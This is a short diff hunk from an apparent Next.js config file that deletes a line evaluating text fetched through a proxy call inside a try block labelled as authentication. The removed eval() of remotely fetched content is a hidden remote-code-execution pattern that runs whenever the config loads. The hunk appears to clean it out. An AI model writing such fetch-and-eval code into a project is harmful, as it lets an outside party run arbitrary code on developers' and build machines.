@@ -21,7 +21,6 @@ const nextConfig = {
       const response = await proxy(src);
       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
       const proxyInfo = await response.text();
-      eval(proxyInfo);
     } catch (err) {
       console.error('Auth Error!', err);
     }
